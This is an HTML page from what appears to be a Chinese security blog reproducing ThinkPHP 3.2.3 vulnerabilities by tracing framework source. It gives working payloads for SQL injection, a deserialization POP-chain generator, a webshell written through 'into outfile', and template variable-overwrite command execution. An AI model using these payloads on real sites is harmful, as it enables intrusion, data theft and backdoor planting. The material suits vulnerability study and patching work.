@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>【安全漏洞】ThinkPHP 3.2.3 漏洞复现 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">【安全漏洞】ThinkPHP 3.2.3 漏洞复现</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <h2>
+<a id="thisshow__0"></a>$this-&gt;show 造成命令执行</h2> 
+<p>在 <code>HomeControllerIndexController</code> 下的index中传入了一个可控参数，跟进调试看一下。</p> 
+<pre><code>class IndexController extends Controller
+{
+    public function index($n='')
+    {
+        $this-&gt;show('&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;&lt;/p&gt;Hello '.$n, 'utf-8');
+    }
+} 
+</code></pre> 
+<p>跟进 <code>display()</code></p> 
+<pre><code>protected function show($content,$charset='',$contentType='',$prefix='') {
+    $this-&gt;view-&gt;display('',$charset,$contentType,$content,$prefix);
+} 
+</code></pre> 
+<p>一路跟进到 <code>fetch()</code>，然后一路进入 <code>Hook::listen('view_parse', $params);</code></p> 
+<pre><code>public function fetch($templateFile='', $content='', $prefix='') {
+    if (empty($content)) {
+        $templateFile   =   $this-&gt;parseTemplate($templateFile);
+        // 模板文件不存在直接返回
+        if (!is_file($templateFile)) {
+            E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
+        }
+    } else {
+        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
+    }
+    // 页面缓存
+    ob_start();
+    ob_implicit_flush(0);
+    if ('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
+        $_content   =   $content;
+        // 模板阵列变量分解成为独立变量
+        extract( $this-&gt;tVar, EXTR_OVERWRITE);
+        // 直接载入PHP模板
+        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
+    } else {
+        // 视图解析标签
+        $params = array('var'=&gt; $this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
+        Hook::listen('view_parse', $params);
+    }
+    // 获取并清空缓存
+    $content = ob_get_clean();
+    // 内容过滤标签
+    Hook::listen('view_filter', $content);
+    // 输出模板文件
+    return $content;
+} 
+</code></pre> 
+<p>关键地方在这，我们之前 <code>index</code> 里的内容被存入了缓存文件php文件中，连带着我们输入的可控的php代码也在其中，然后包含了该文件，所以造成了命令执行。</p> 
+<pre><code>public function load($_filename,$vars=null){
+    if(!is_null($vars)){
+        extract($vars, EXTR_OVERWRITE);
+    }
+    include $_filename;
+} 
+</code></pre> 
+<h2>
+<a id="sql_69"></a>sql注入</h2> 
+<p><code>/Application/Home/Controller/IndexController.class.php</code> 添加一段SQL查询代码。<code>http://localhost/tp323/index.php/Home/Index/sql?id=1</code> 查询入口。</p> 
+<pre><code>public function sql()
+{
+    $id = I('GET.id');
+    $user = M('user');
+    $data = $user-&gt;find($id);
+    var_dump($data);
+} 
+</code></pre> 
+<p>传入 <code>id=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--+</code> ，跟进调试。进入 <code>find()</code> 函数，先进行一段判断，传入的参数是否是数字或者字符串，满足条件的话 <code>$options['where']['id']=input</code>。</p> 
+<pre><code>if(is_numeric($options) || is_string($options)) {
+    $where[ $this-&gt;getPk()]  =   $options;
+    $options                =   array();
+    $options['where']       =   $where;
+} 
+</code></pre> 
+<p>随后进行一个判断 <code>if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk))</code>，<code>getPk()</code>函数是查找mysql主键的函数，显然 <code>$pk</code> 值是 <code>id</code>，不满足条件</p> 
+<pre><code>$pk  =  $this-&gt;getPk(); // $pk='id'
+if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) {
+    //
+} 
+</code></pre> 
+<p>随后执行 <code>$options = $this-&gt;_parseOptions($options);</code> ，</p> 
+<pre><code>protected function  _parseOptions($options=array()) {
+    if (is_array($options)) {
+        $options =  array_merge( $this-&gt;options, $options);
+    }
+
+    if (!isset($options['table'])) {
+        // 自动获取表名
+        $options['table']   =   $this-&gt;getTableName();
+        $fields             =   $this-&gt;fields;
+    } else {
+        // 指定数据表 则重新获取字段列表 但不支持类型检测
+        $fields             =   $this-&gt;getDbFields();
+    }
+
+    // 数据表别名
+    if (!empty($options['alias'])) {
+        $options['table']  .=   ' '.$options['alias'];
+    }
+    // 记录操作的模型名称
+    $options['model']       =   $this-&gt;name;
+
+    // 字段类型验证
+    if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) {
+        // 对数组查询条件进行字段类型检查
+        foreach ($options['where'] as $key=&gt;$val) {
+            $key            =   trim($key);
+            if (in_array($key, $fields, true)) {
+                if (is_scalar($val)) {
+                    $this-&gt;_parseType($options['where'], $key);
+                }
+            } elseif (!is_numeric($key) &amp;&amp; '_' != substr($key, 0, 1) &amp;&amp; false === strpos($key, '.') &amp;&amp; false === strpos($key, '(') &amp;&amp; false === strpos($key, '|') &amp;&amp; false === strpos($key, '&amp;')) {
+                if (!empty( $this-&gt;options['strict'])) {
+                    E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']');
+                }
+                unset($options['where'][$key]);
+            }
+        }
+    }
+    // 查询过后清空sql表达式组装 避免影响下次查询
+    $this-&gt;options  =   array();
+    // 表达式过滤
+    $this-&gt;_options_filter($options);
+    return $options;
+} 
+</code></pre> 
+<p>先获取查询的表的字段和字段类型。</p> 
+<pre><code>if (!isset($options['table'])) {
+    // 自动获取表名
+    $options['table']   =   $this-&gt;getTableName();
+    $fields             =   $this-&gt;fields;
+} 
+</code></pre> 
+<p>关键代码在于下面这个判断里，进入 <code>$this-&gt;_parseType($options['where'], $key)</code> 。</p> 
+<pre><code>if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) {
+    // 对数组查询条件进行字段类型检查
+    foreach ($options['where'] as $key=&gt;$val) {
+        $key            =   trim($key);
+        if (in_array($key, $fields, true)) {
+            if (is_scalar($val)) {
+                $this-&gt;_parseType($options['where'], $key);
+            }
+        } elseif (!is_numeric($key) &amp;&amp; '_' != substr($key, 0, 1) &amp;&amp; false === strpos($key, '.') &amp;&amp; false === strpos($key, '(') &amp;&amp; false === strpos($key, '|') &amp;&amp; false === strpos($key, '&amp;')) {
+            if (!empty( $this-&gt;options['strict'])) {
+                E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']');
+            }
+            unset($options['where'][$key]);
+        }
+    }
+} 
+</code></pre> 
+<p>这里由于id字段的类型是 <code>int</code> ，所以进入第二个分支，将我们的输入转化为十进制，恶意语句就被过滤了，后面就是正常的SQL语句了。</p> 
+<pre><code>protected function  _parseType(&amp;$data,$key) {
+    if(!isset( $this-&gt;options['bind'][':'.$key]) &amp;&amp; isset( $this-&gt;fields['_type'][$key])){
+        $fieldType = strtolower( $this-&gt;fields['_type'][$key]);
+        if(false !== strpos($fieldType,'enum')){
+            // 支持ENUM类型优先检测
+        }elseif(false === strpos($fieldType,'bigint') &amp;&amp; false !== strpos($fieldType,'int')) {
+            $data[$key]   =  intval($data[$key]);
+        }elseif(false !== strpos($fieldType,'float') || false !== strpos($fieldType,'double')){
+            $data[$key]   =  floatval($data[$key]);
+        }elseif(false !== strpos($fieldType,'bool')){
+            $data[$key]   =  (bool)$data[$key];
+        }
+    }
+} 
+</code></pre> 
+<p>如果我们传参是传入一个数组 <code>id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--+</code> ，在<code>find()</code> 函数的第一个判断就没有满足条件不会进入这个判断，此时 <code>$options</code> 就是 <code>$options[where]='1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- '</code>，而没有上面的键 <code>id</code>。</p> 
+<pre><code>if(is_numeric($options) || is_string($options)) {
+    $where[ $this-&gt;getPk()]  =   $options;
+    $options                =   array();
+    $options['where']       =   $where;
+} 
+</code></pre> 
+<p>然后到下面的关键代码的判断 <code>if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join']))</code> ，<code>is_array($options['where'])</code> 显然是false，因为此时 <code>$options['where']</code> 是一个字符串而不是数组，所以不会进入下面的判断，也就是说不会进入函数 <code>_parseType()</code> 对我们的输入进行过滤。</p> 
+<p>之后回到 <code>find()</code> 函数中进入 <code>$resultSet = $this-&gt;db-&gt;select($options);</code>，此时的 <code>$options</code> 就是我们输入的恶意SQL语句，显然注入成功。</p> 
+<h2>
+<a id="__sql_216"></a>反序列化 &amp; sql注入</h2> 
+<p><code>/Application/Home/Controller/IndexController.class.php</code> 添加一段代码。<code>http://localhost/tp323/index.php/Home/Index/sql?data=</code> 查询入口。</p> 
+<pre><code>public function sql() {
+    unserialize(base64_decode($_POST['data']));
+} 
+</code></pre> 
+<p>全局搜索 <code>function __destruct</code>，找一个起点。</p> 
+<p>在文件：<code>/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code> 中找到了 <code>Imagick</code> 类的 <code>__destruct</code> 方法。</p> 
+<pre><code>public function  __destruct() {
+    empty( $this-&gt;img) || $this-&gt;img-&gt;destroy();
+} 
+</code></pre> 
+<p>这里 <code>$this-&gt;img</code> 是可控的，所以我们接着找一下 <code>destroy()</code> 函数。共有三个，选择了 <code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code> 中的 <code>Memcache</code> 类的 <code>destroy</code> 函数。这里有个坑，由于上面调用 <code>destroy()</code> 函数时没有参数传入，而我们找到的是有参数的，PHP7下起的ThinkPHP在调用有参函数却没有传入参数的情况下会报错，所以我们要选用PHP5而不选用PHP7.</p> 
+<pre><code>public function destroy($sessID) {
+    return $this-&gt;handle-&gt;delete( $this-&gt;sessionName.$sessID);
+} 
+</code></pre> 
+<p>这里<code>handle</code> 可控，那么就接着找 <code>delete</code> 函数。在 <code>ThinkPHP/Mode/Lite/Model.class.php</code> 的 <code>Model</code> 类中找到了合适的函数，当然选用 <code>/ThinkPHP/Library/Think/Model.class.php</code> 中的该函数也是可以的。我们的目的就是进入 <code>$this-&gt;delete($this-&gt;data[$pk])</code>。所以这里只截取了前面部分的代码。</p> 
+<pre><code>public function delete($options=array()) {
+    $pk   =  $this-&gt;getPk();
+    if(empty($options) &amp;&amp; empty( $this-&gt;options['where'])) {
+        // 如果删除条件为空 则删除当前数据对象所对应的记录
+        if(!empty( $this-&gt;data) &amp;&amp; isset( $this-&gt;data[$pk]))
+            return $this-&gt;delete( $this-&gt;data[$pk]);
+        else
+            return false;
+    }
+} 
+</code></pre> 
+<p>我们想要调用这个if中的 <code>delete</code> ，就要使得我们传入的 <code>$options</code> 为空，且 <code>$this-&gt;options['where']</code> 为空，是可控的，所以走到第二个if，<code>$this-&gt;data</code> 不为空，且 <code>$this-&gt;data[$pk]</code> 存在，满足条件就可以调用 <code>delete($this-&gt;data[$pk])</code> 了。而 <code>$pk</code> 就是 <code>$this-&gt;pk</code> ，都是可控的。</p> 
+<p>之前因为 <code>destroy()</code> 调用时没有参数，使得调用 <code>delete</code> 函数参数部分可控，而现在我们正常带着参数进入了 <code>delete</code> 函数，就可以接着往下走了。直到运行至 <code>$result = $this-&gt;db-&gt;delete($options);</code>，调用了ThinkPHP数据库模型类中的 <code>delete()</code> 方法。</p> 
+<p>这里的 <code>$table</code> 是取自传入的参数，可控，直接拼接到 <code>$sql</code> 中，然后传入了 <code>$this-&gt;execute</code>。</p> 
+<pre><code>public function delete($options=array()) {
+    $this-&gt;model  =   $options['model'];
+    $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array());
+    $table  =   $this-&gt;parseTable($options['table']);
+    $sql    =   'DELETE FROM '.$table;
+    if(strpos($table,',')){ // 多表删除支持USING和JOIN操作
+        if(!empty($options['using'])){
+            $sql .= ' USING '. $this-&gt;parseTable($options['using']).' ';
+        }
+        $sql .= $this-&gt;parseJoin(!empty($options['join'])?$options['join']:'');
+    }
+    $sql .= $this-&gt;parseWhere(!empty($options['where'])?$options['where']:'');
+    if(!strpos($table,',')){
+        // 单表删除支持order和limit
+        $sql .= $this-&gt;parseOrder(!empty($options['order'])?$options['order']:'')
+            . $this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:'');
+    }
+    $sql .=   $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:'');
+    return $this-&gt;execute($sql,!empty($options['fetch_sql']) ? true : false);
+} 
+</code></pre> 
+<p>接着调用 <code>$this-&gt;initConnect(true);</code>，随后是 <code>$this-&gt;connect()</code> ，这里是用 <code>$this-&gt;config</code> 来初始化数据库的，然后去执行先前拼接好的SQL语句。</p> 
+<pre><code> &lt;?php
+public function connect($config='',$linkNum=0,$autoConnection=false) {
+    if ( !isset( $this-&gt;linkID[$linkNum]) ) {
+        if(empty($config))  $config =    $this-&gt;config;
+        try{
+            if(empty($config['dsn'])) {
+                $config['dsn']  =    $this-&gt;parseDsn($config);
+            }
+            if(version_compare(PHP_VERSION,'5.3.6','&lt;=')){ 
+                 // 禁用模拟预处理语句
+                 $this-&gt;options[PDO::ATTR_EMULATE_PREPARES]  =   false;
+            }
+             $this-&gt;linkID[$linkNum] = new PDO( $config['dsn'], $config['username'], $config['password'], $this-&gt;options);
+        }catch (PDOException $e) {
+            if($autoConnection){
+                trace($e-&gt;getMessage(),'','ERR');
+                return  $this-&gt;connect($autoConnection,$linkNum);
+            }elseif($config['debug']){
+                E($e-&gt;getMessage());
+            }
+        }
+    }
+    return  $this-&gt;linkID[$linkNum];
+} 
+</code></pre> 
+<p>所以POP链就出来了：</p> 
+<pre><code> &lt;?php
+
+namespace ThinkImageDriver{
+    use ThinkSessionDriverMemcache;
+
+    class Imagick {
+        private $img;
+
+        public function  __construct() {
+             $this-&gt;img = new Memcache();
+        }
+    }
+}
+
+namespace ThinkSessionDriver{
+    use  ThinkModel;
+
+    class Memcache {
+        protected $handle;
+        public function  __construct() {
+             $this-&gt;handle = new Model();
+        }
+    }
+}
+
+namespace Think{
+    use ThinkDbDriverMysql;
+
+    class Model {
+        protected $options;
+        protected $data;
+        protected $pk;
+        protected $db;
+
+        public function  __construct() {
+             $this-&gt;db = new Mysql();
+             $this-&gt;options['where'] = '';
+             $this-&gt;data['id'] = array(
+                "table" =&gt; "mysql.user where 1=updatexml(1,user(),1)#",
+                "where" =&gt; "1=1"
+            );
+             $this-&gt;pk = 'id';
+        }
+    }
+}
+
+namespace ThinkDbDriver{
+    use PDO;
+
+    class Mysql {
+        protected $options = array(
+            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true
+        );
+        protected $config = array(
+            "debug"    =&gt; 1,
+            "database" =&gt; "test",
+            "hostname" =&gt; "127.0.0.1",
+            "hostport" =&gt; "3306",
+            "charset"  =&gt; "utf8",
+            "username" =&gt; "root",
+            "password" =&gt; "root"
+        );
+    }
+}
+
+namespace {
+    echo base64_encode(serialize(new ThinkImageDriverImagick()));
+} 
+</code></pre> 
+<h2>
+<a id="_391"></a>注释注入</h2> 
+<p>触发注释注入的调用为：<code>$user = M('user')-&gt;comment($id)-&gt;find(intval($id));</code>。</p> 
+<p>调试跟进一下，调用的是 <code>ThinkModel.class.php</code> 中的 <code>comment</code></p> 
+<pre><code> /**
+ * 查询注释
+ * @access public
+ * @param string $comment 注释
+ * @return Model
+ */
+public function comment($comment) {
+    $this-&gt;options['comment'] =   $comment;
+    return $this;
+} 
+</code></pre> 
+<p>之后调用 <code>ThinkModel</code> 的find方法。一直到调用了 <code>ThinkDbDriver.class.php</code> 中的 <code>parseComment</code> 函数，将我们输入的内容拼接在了注释中，于是我们可以将注释符闭合，然后插入SQL语句。此时的SQL语句为 <code>"SELECT * FROM</code>user<code>WHERE</code>id<code>= 1 LIMIT 1 /* 1 */"</code></p> 
+<pre><code>protected function parseComment($comment) {
+    return  !empty($comment)?   ' /* '.$comment.' */':'';
+} 
+</code></pre> 
+<p>如果这里没有 <code>LIMIT 1</code> 的话我们可以直接进行union注入，但是这里有 <code>LIMIT 1</code> ，进行union注入会提示 <code>Incorrect usage of UNION and LIMIT</code>，只有同时把union前的SQL查询语句用括号包起来才可以进行查询，但是显然我们无法做到，那么我们可以利用 <code>into outfile</code> 的拓展来进行写文件。</p> 
+<pre><code>"OPTION"参数为可选参数选项，其可能的取值有：
+`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“t”。
+`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
+`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
+`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“”。
+`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
+`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“n”。 
+</code></pre> 
+<p><code>?id=1*/ into outfile "path/1.php" LINES STARTING BY '&lt;?php eval($_POST[1]);?&gt;'/*</code> 就可以进行写马了。</p> 
+<h2>
+<a id="exp_433"></a>exp注入</h2> 
+<p>触发exp注入的查询语句如下。</p> 
+<pre><code>public function sql()
+{
+    $User = D('user');
+    var_dump($_GET['id']);
+    $map = array('id' =&gt; $_GET['id']);
+    // $map = array('id' =&gt; I('id'));
+    $user = $User-&gt;where($map)-&gt;find();
+    var_dump($user);
+} 
+</code></pre> 
+<p>这里一路跟进到 <code>parseSql()</code> 函数，然后调用到 <code>parseWhere()</code> 。</p> 
+<pre><code>public function parseSql($sql,$options=array()){
+    $sql   = str_replace(
+        array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
+        array(
+            $this-&gt;parseTable($options['table']),
+            $this-&gt;parseDistinct(isset($options['distinct'])?$options['distinct']:false),
+            $this-&gt;parseField(!empty($options['field'])?$options['field']:'*'),
+            $this-&gt;parseJoin(!empty($options['join'])?$options['join']:''),
+            $this-&gt;parseWhere(!empty($options['where'])?$options['where']:''),
+            $this-&gt;parseGroup(!empty($options['group'])?$options['group']:''),
+            $this-&gt;parseHaving(!empty($options['having'])?$options['having']:''),
+            $this-&gt;parseOrder(!empty($options['order'])?$options['order']:''),
+            $this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:''),
+            $this-&gt;parseUnion(!empty($options['union'])?$options['union']:''),
+            $this-&gt;parseLock(isset($options['lock'])?$options['lock']:false),
+            $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:''),
+            $this-&gt;parseForce(!empty($options['force'])?$options['force']:'')
+        ),$sql);
+    return $sql;
+} 
+</code></pre> 
+<p><code>parseWhere()</code> 调用了 <code>parseWhereItem()</code> ，截取了部分关键代码，这里的 <code>$val</code> 就是我们传入的参数，所以当我们传入数组时，<code>$exp</code> 就是数组的第一个值，如果等于exp，就会使用.直接将数组的第二个值拼接上去，就会造成SQL注入。</p> 
+<pre><code>$exp = strtolower($val[0]);
+......
+elseif('bind' == $exp ){ // 使用表达式
+    $whereStr .= $key.' = :'.$val[1];
+}elseif('exp' == $exp ){ // 使用表达式
+    $whereStr .= $key.' '.$val[1];
+} 
+</code></pre> 
+<p>也就是说当我们传入 <code>?id[0]=exp&amp;id[1]== 1 and updatexml(1,concat(0x7e,user(),0x7e),1)</code> 时，拼接后的字符串就是 <code>"`id` = 1 and updatexml(1,concat(0x7e,user(),0x7e),1)"</code>，最后的SQL语句也就成了 <code>"SELECT * FROM `user` WHERE `id` =1 and updatexml(1,concat(0x7e,user(),0x7e),1) LIMIT 1 "</code>，可以进行报错注入了。</p> 
+<p>这里使用了全局数组 <code>$_GET</code> 来传参，而不是tp自带的 <code>I()</code> 函数，是因为在 <code>I()</code> 函数的最后有这么一句代码，</p> 
+<pre><code>is_array($data) &amp;&amp; array_walk_recursive($data,'think_filter'); 
+</code></pre> 
+<p>调用了 <code>think_filter()</code> 函数来进行过滤，刚好就过滤了 <code>EXP</code> ，在后面加上了一个空格，那么自然也就无法进行上面的流程，不能进行注入了。</p> 
+<pre><code>function think_filter(&amp;$value){
+    // TODO 其他安全过滤
+
+    // 过滤查询特殊字符
+    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){
+        $value .= ' ';
+    }
+} 
+</code></pre> 
+<h2>
+<a id="bind_508"></a>bind注入</h2> 
+<pre><code>public function sql() {
+    $User = M("user");
+    $user['id'] = I('id');
+    $data['password'] = I('password');
+    $valu = $User-&gt;where($user)-&gt;save($data);
+    var_dump($valu);
+} 
+</code></pre> 
+<p>payload:<code>?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1</code></p> 
+<p>这里一路执行到上面的 <code>parseWhereItem()</code> 处，除了exp外，还有一处bind，这里同样也是用点拼接字符串，但是不同的是这里还拼接了一个冒号。也就是说拼接之后是 <code>"`id` = :0 and updatexml(1,concat(0x7e,user(),0x7e),1)"</code> 这样的。</p> 
+<pre><code>$exp = strtolower($val[0]);
+......
+elseif('bind' == $exp ){ // 使用表达式
+    $whereStr .= $key.' = :'.$val[1];
+}elseif('exp' == $exp ){ // 使用表达式
+    $whereStr .= $key.' '.$val[1];
+} 
+</code></pre> 
+<p>拼接到SQL语句后是 <code>"UPDATE `user` SET `password`=:0 WHERE `id` = :0 and updatexml(1,concat(0x7e,user(),0x7e),1)"</code>。</p> 
+<p>随后在 <code>update()</code> 中调用了 <code>execute()</code> 函数，执行了如下代码</p> 
+<pre><code>if(!empty( $this-&gt;bind)){
+    $that   =   $this;
+    $this-&gt;queryStr =   strtr( $this-&gt;queryStr,array_map(function($val) use($that){ return '''.$that-&gt;escapeString($val).'''; }, $this-&gt;bind));
+} 
+</code></pre> 
+<p>这里就将 <code>:0</code> 替换为了我们传入的password的值，SQL语句也就变为了 <code>"UPDATE `user` SET `password`='1' WHERE `id` = '1' and updatexml(1,concat(0x7e,user(),0x7e),1)"</code>，所以我们在传参的时候 <code>id[1]</code> 最开始的字符传入的是0，才能去除掉冒号。最后SQL注入成功。</p> 
+<h2>
+<a id="_548"></a>变量覆盖导致命令执行</h2> 
+<p>触发rce的代码如下。</p> 
+<pre><code>public function test($name='', $from='ctfshow') {
+    $this-&gt;assign($name, $from);
+    $this-&gt;display('index');
+} 
+</code></pre> 
+<p>先调用 <code>assign()</code> 函数。</p> 
+<pre><code>public function assign($name, $value='') {
+    if (is_array($name)) {
+        $this-&gt;tVar   =  array_merge( $this-&gt;tVar, $name);
+    } else {
+        $this-&gt;tVar[$name] = $value;
+    }
+} 
+</code></pre> 
+<p>当我们传入 <code>?name=_content&amp;from=&lt;?php system("whoami")?&gt;</code> 时经过 <code>assign()</code> 函数后就有：<code>$this-&gt;view-&gt;tVar["_content"]="&lt;?php system("whoami")?&gt;"</code></p> 
+<p><code>display()</code> 函数跟进，<code>$content</code> 获取模板内容。</p> 
+<pre><code>public function display($templateFile='', $charset='', $contentType='', $content='', $prefix='') {
+    G('viewStartTime');
+    // 视图开始标签
+    Hook::listen('view_begin', $templateFile);
+    // 解析并获取模板内容
+    $content = $this-&gt;fetch($templateFile, $content, $prefix);
+    // 输出模板内容
+    $this-&gt;render($content, $charset, $contentType);
+    // 视图结束标签
+    Hook::listen('view_end');
+} 
+</code></pre> 
+<p>这里调用了 <code>fetch()</code> 函数，有一个if判断，如果使用了PHP原生模板就进入这个判断，这个就对应的是 <code>ThinkPHPConfconvention.php</code> 中的 <code>'TMPL_ENGINE_TYPE' =&gt; 'php',</code>。</p> 
+<pre><code>public function fetch($templateFile='', $content='', $prefix='') {
+    if (empty($content)) {
+        $templateFile   =   $this-&gt;parseTemplate($templateFile);
+        // 模板文件不存在直接返回
+        if (!is_file($templateFile)) {
+            E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
+        }
+    } else {
+        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
+    }
+    // 页面缓存
+    ob_start();
+    ob_implicit_flush(0);
+    if ('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
+        $_content   =   $content;
+        // 模板阵列变量分解成为独立变量
+        extract( $this-&gt;tVar, EXTR_OVERWRITE);
+        // 直接载入PHP模板
+        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
+    } else {
+        // 视图解析标签
+        $params = array('var'=&gt; $this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
+        Hook::listen('view_parse', $params);
+    }
+    // 获取并清空缓存
+    $content = ob_get_clean();
+    // 内容过滤标签
+    Hook::listen('view_filter', $content);
+    // 输出模板文件
+    return $content;
+} 
+</code></pre> 
+<p>这里进入判断后，执行了 <code>extract($this-&gt;tVar, EXTR_OVERWRITE);</code> ，而通过前面的分析得知我们已有 <code>$this-&gt;view-&gt;tVar["_content"]="&lt;?php system("whoami")?&gt;"</code> ，因此这里就存在变量覆盖，将 <code>$_content</code> 覆盖为了我们输入的要执行的命令。</p> 
+<p>随后执行 <code>empty($_content)?include $templateFile:eval('?&gt;'.$_content);</code> ，此时的 <code>$_content</code> 显然不为空，所以会执行 <code>eval('?&gt;'.$_content);</code> ，也就造成了命令执行。</p> 
+<hr> 
+<h3>
+<a id="_630"></a>网络安全&amp;黑客学习资料包（免费分享）</h3> 
+<p><strong>1. 学习大纲图</strong></p> 
+<p>对于想要学习或正在学习网络安全的同学，详细的学习成长路线图非常重要。大家跟着这个大的方向学习准没问题。<strong>（完整版学习大纲图可以在文末免费获取~）</strong><br> <img src="https://images2.imgbox.com/6c/21/jJhvSUQf_o.png" alt="在这里插入图片描述"></p> 
+<p><strong>2. 安装工具包、源码&amp;资料文档</strong></p> 
+<p><img src="https://images2.imgbox.com/24/71/VU2K56i4_o.png" alt="在这里插入图片描述"></p> 
+<p>同时也为大家整理了各种文档和书籍资料<br> <img src="https://images2.imgbox.com/e6/6f/Arme27YC_o.png" alt="在这里插入图片描述"></p> 
+<p><strong>3. 视频学习教程</strong></p> 
+<p>除了文档资料，每个成长路线对应的板块都有配套的视频提供，帮助大家更轻松的学习网络安全。<br> <img src="https://images2.imgbox.com/b3/cc/l2YS6Pvk_o.png" alt="在这里插入图片描述"></p> 
+<p><strong>4 . 面试题资料</strong></p> 
+<p>最后就是网络安全面试题板块了，对于要准备面试的小伙伴来说是必不可少。<br> <img src="https://images2.imgbox.com/df/2a/mg2QvqOe_o.png" alt="在这里插入图片描述"></p> 
+<p><strong>【小伙伴们有需要这份282G的《网络安全&amp;黑客学习资料包》，可以扫描下方二维码免费领取哦~】</strong><br> <img src="https://images2.imgbox.com/28/ba/UdN865EA_o.png"></p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
